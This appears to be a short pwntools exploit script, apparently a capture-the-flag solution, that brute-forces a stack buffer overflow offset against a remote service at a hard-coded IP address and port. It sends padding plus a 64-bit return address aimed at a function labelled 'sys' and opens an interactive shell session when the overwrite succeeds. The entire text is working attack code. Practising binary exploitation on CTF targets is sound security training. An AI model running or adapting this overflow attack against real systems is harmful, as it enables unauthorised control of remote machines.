from pwn import *

sys = 0x40060d

for i in range(100):
    print(i)
    try:
        io = remote("61.147.171.105", 49794)
        payload = b'A' * i + p64(sys)
        io.recvuntil(">")
        io.sendline(payload)
        print(io.recv())
        io.interactive()
    except:
        io.close()